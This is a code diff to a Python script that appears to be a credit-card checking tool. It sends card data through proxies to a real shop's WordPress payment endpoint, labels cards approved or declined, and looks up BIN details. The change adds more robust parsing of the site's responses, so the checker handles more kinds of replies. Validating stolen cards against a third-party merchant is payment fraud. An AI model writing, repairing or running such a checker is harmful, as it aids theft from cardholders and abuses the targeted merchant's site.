@@ -520,14 +520,23 @@ DECLINED CC ❌
 
             response2 = session.post('https://butcher.ie/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
             
-            # Check if response is valid JSON
+            # FIXED: Handle the case where response might not be JSON or might be an integer
+            website_response = {}
             try:
-                website_response = response2.json()
-            except:
-                # If response is not JSON, create a proper response structure
+                if response2.text:  # Check if response is not empty
+                    website_response = response2.json()
+                    
+                    # If response is an integer (like 0 or 1), convert it to a proper dict
+                    if isinstance(website_response, (int, float)):
+                        website_response = {
+                            'success': bool(website_response),
+                            'data': {'status': 'unknown'}
+                        }
+            except Exception as json_error:
+                # If JSON parsing fails, create a default response
                 website_response = {
                     'success': False,
-                    'data': {'error': {'message': 'Invalid response from server'}}
+                    'data': {'error': {'message': 'Invalid JSON response'}}
                 }
             
             # Get final message with 3DS info
@@ -537,7 +546,7 @@ DECLINED CC ❌
             bin_info = get_bin_info(n)
             
             # Check the actual status from the response
-            if website_response.get('success'):
+            if isinstance(website_response, dict) and website_response.get('success'):
                 data_section = website_response.get('data', {})
                 status = data_section.get('status', '')
                 
@@ -588,7 +597,7 @@ DECLINED CC ❌
 """
             else:
                 # Check for specific error messages that should be treated as APPROVED
-                error_data = website_response.get('data', {})
+                error_data = website_response.get('data', {}) if isinstance(website_response, dict) else {}
                 if 'error' in error_data:
                     error_msg = error_data['error'].get('message', '').lower()
                     
